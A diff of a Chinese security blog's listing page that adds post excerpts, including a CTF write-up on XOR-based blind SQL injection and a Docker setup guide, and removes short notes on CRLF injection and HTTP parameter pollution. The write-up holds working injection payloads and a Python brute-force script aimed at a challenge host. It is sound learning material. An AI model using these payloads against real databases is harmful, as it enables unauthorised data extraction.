@@ -212,6 +212,266 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/" class="post-title-link" itemprop="url">从CTF题中学习几种有趣(奇怪)的SQL注入</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-06-09 12:37:58" itemprop="dateCreated datePublished" datetime="2019-06-09T12:37:58+08:00">2019-06-09</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:14" itemprop="dateModified" datetime="2019-08-23T14:19:14+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>文章已投稿至先知社区，具体内容：<a href="https://xz.aliyun.com/t/5356" target="_blank" rel="noopener">从CTF题中学习几种有趣(奇怪)的SQL注入</a></p>
+<h2 id="1-异或注入"><a href="#1-异或注入" class="headerlink" title="1.异或注入"></a>1.异或注入</h2><p>题目地址：<a href="http://119.23.73.3:5004/" target="_blank" rel="noopener">http://119.23.73.3:5004/</a></p>
+<p>在一个师傅的博客中看到这题的Writeup，尝试按照他的payload进行复现，怎么都复现不出来。后来在安全客上看到另一篇异或注入的文章，才把这个题解决了。</p>
+<p>初步测试之后会发现，题目过滤了<code>空格，+，*，or，substr</code>…等一些字符。而且#号注释也不起作用。</p>
+<p>于是尝试异或注入。</p>
+<pre><code>http://119.23.73.3:5004/?id=1&apos;^&apos;1    返回错误
+http://119.23.73.3:5004/?id=1&apos;^&apos;0    返回正常
+</code></pre><p>在MYSQL命令中：</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c0da0cab77879.jpg" alt="01_mysql.jpg"></p>
+<p>可见，当/?id=1’^’1时，传递到数据库当中，是id=0，由于为0的id不存在，所以这里返回错误。第二个同理。</p>
+<p>这里属于布尔盲注，于是构造payload，用脚本跑：</p>
+<p>检索数据库：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))=104))^&apos;1&apos;=&apos;1
+
+检索出来的库为：information_schema,moctf,mysql,performance_schema
+</code></pre><p>检索表：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema=&apos;moctf&apos;)),1,1))=104))^&apos;1&apos;=&apos;1
+
+检索出来的表：do_y0u_l1ke_long_t4ble_name,news
+</code></pre><p>检索字段：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name=&apos;do_y0u_l1ke_long_t4ble_name&apos;)),1,1))=104))^&apos;1&apos;=&apos;1
+
+检索出来的字段：d0_you_als0_l1ke_very_long_column_name
+</code></pre><p>读Flag：</p>
+<pre><code>id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(d0_you_als0_l1ke_very_long_column_name))FROM(moctf.do_y0u_l1ke_long_t4ble_name)),1,1))=104))^&apos;1&apos;=&apos;1
+
+moctfb1ind_SQL_1njecti0n_g0od
+</code></pre><p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#文字转ascii ord()</span></span><br><span class="line"><span class="comment">#ascii转文字 ascii()</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,"</span></span><br><span class="line">url = <span class="string">"http://119.23.73.3:5004/?id=2'^"</span></span><br><span class="line">keyword = <span class="string">"Tip"</span></span><br><span class="line">string = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;))^'1'='1"</span>.format(str(i),ord(j))</span><br><span class="line">        url_get = url + payload</span><br><span class="line">        print(url_get)</span><br><span class="line">        content = requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> content.text:</span><br><span class="line">            string += j</span><br><span class="line">            print(string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"result = "</span> + string)</span><br></pre></td></tr></table></figure>
+<p>跑出来的Flag：</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c1236ef825006.jpg" alt="01_getflag.jpg"><br>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </p></div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/06/初探Docker之搭建CTF平台/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/06/06/初探Docker之搭建CTF平台/" class="post-title-link" itemprop="url">初探Docker之搭建CTF平台</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-06-06 15:03:40" itemprop="dateCreated datePublished" datetime="2019-06-06T15:03:40+08:00">2019-06-06</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:25" itemprop="dateModified" datetime="2019-08-23T14:19:25+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>腾讯10元学生机 <a href="https://cloud.tencent.com/act/campus?fromSource=gwzcw.1110156.1110156.1110156&amp;gclid=CjwKCAjw0N3nBRBvEiwAHMwvNlylCbGdNZtjAnOQXkyllVSfCVgTS8gvywBaaFainLdyhJDNkvadPhoCgjQQAvD_BwE" target="_blank" rel="noopener">购买</a><br>也可以使用阿里云的学生机，都很便宜。</p>
+<p>这里我选择了Ubuntu系统。</p>
+<h2 id="安装Docker-Docker-compose"><a href="#安装Docker-Docker-compose" class="headerlink" title="安装Docker + Docker-compose"></a>安装Docker + Docker-compose</h2><ul>
+<li>安装Docker：</li>
+</ul>
+<p>可以参考这个：<a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">Ubuntu Docker 安装</a></p>
+<pre><code>安装最新的docker
+wget -qO- https://get.docker.com/ | sh
+
+安装完会有一个提示，按照提示去执行
+sudo usermod -aG docker ubuntu
+</code></pre><p>命令执行完成之后，执行 <code>docker verison</code> 来查看是否安装完成。</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf8b92a35cbe47448.jpg" alt="anzhuangdocker.jpg"></p>
+<ul>
+<li>安装Docker-compose：</li>
+</ul>
+<p>参考：<a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a></p>
+<p>因为我的腾讯云不是root权限，在执行命令前要加sudo</p>
+<pre><code>sudo curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
+
+sudo chmod +x /usr/local/bin/docker-compose
+</code></pre><p>同样的，命令执行完成之后，执行 <code>docker-compose verison</code> 来查看是否安装完成。</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf8b92a4434a94613.jpg" alt="anzhuangdockercompose.jpg"><br>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/06/初探Docker之搭建CTF平台/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </p></div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/29/PHP代码审计之SQL注入与审计流程/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1185,239 +1445,11 @@ RSASHA256(
   </article>
 
     
-      
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/01/CRLF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2019/01/01/CRLF/" class="post-title-link" itemprop="url">了解CRLF</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-01-01 12:00:00" itemprop="dateCreated datePublished" datetime="2019-01-01T12:00:00+08:00">2019-01-01</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2019-08-23 14:17:00" itemprop="dateModified" datetime="2019-08-23T14:17:00+08:00">2019-08-23</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Simple-note"><a href="#Simple-note" class="headerlink" title="Simple note:"></a>Simple note:</h2><p>CRLF: Carriage-Return Line-Feend.</p>
-<p>Use <code>CR, ASCII 13 \r (回车)</code> , <code>LF, ASCII 10, \n</code> and <code>%0d%0a</code> to break the HTTP request.</p>
-<p>In the  penetration test, if we found a request is like this:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /test/demo.php?url=https://www.threezh1.com</span><br><span class="line">That we can contral.</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-<p>If the HTTP Header of the request return with the response, which means we can control the HTTP Header.(Of course include the Url.)</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Encoding: deflate</span><br><span class="line">...</span><br><span class="line">That we can contral.</span><br><span class="line">...</span><br><span class="line">Locations=https:<span class="comment">//www.threezh1.com</span></span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/01/01/CRLF/#more" rel="contents">
-                Weiterlesen &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-      
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/01/HPP_Subdomain_takeover/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2019/01/01/HPP_Subdomain_takeover/" class="post-title-link" itemprop="url">了解HPP</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-01-01 12:00:00" itemprop="dateCreated datePublished" datetime="2019-01-01T12:00:00+08:00">2019-01-01</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2019-08-23 14:17:26" itemprop="dateModified" datetime="2019-08-23T14:17:26+08:00">2019-08-23</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h1><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><p>存在于POST,GET之中。</p>
-<p>步骤：</p>
-<ol>
-<li>page?par1=vall</li>
-<li>page?par1=HPP_TEST1</li>
-<li>page?par1=val1&amp;par1=HPP_TEST1</li>
-</ol>
-<p><img src="https://i.loli.net/2019/03/25/5c982a7096f07.jpg" alt="图片"></p>
-<p>更详细的：<a href="https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/" target="_blank" rel="noopener">https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/</a></p>
-<p>Use to:</p>
-<ol>
-<li>取代现有的编码HTTP参数。</li>
-<li>更改或修改预期/正常应用程序行为。</li>
-<li>访问并利用未正确控制的变量。</li>
-<li>绕过WAF规则或输入验证机制。</li>
-</ol>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/01/01/HPP_Subdomain_takeover/#more" rel="contents">
-                Weiterlesen &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
   </nav>
 
 
@@ -1463,7 +1495,7 @@ RSASHA256(
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">Artikel</span>
         </a>
       </div>
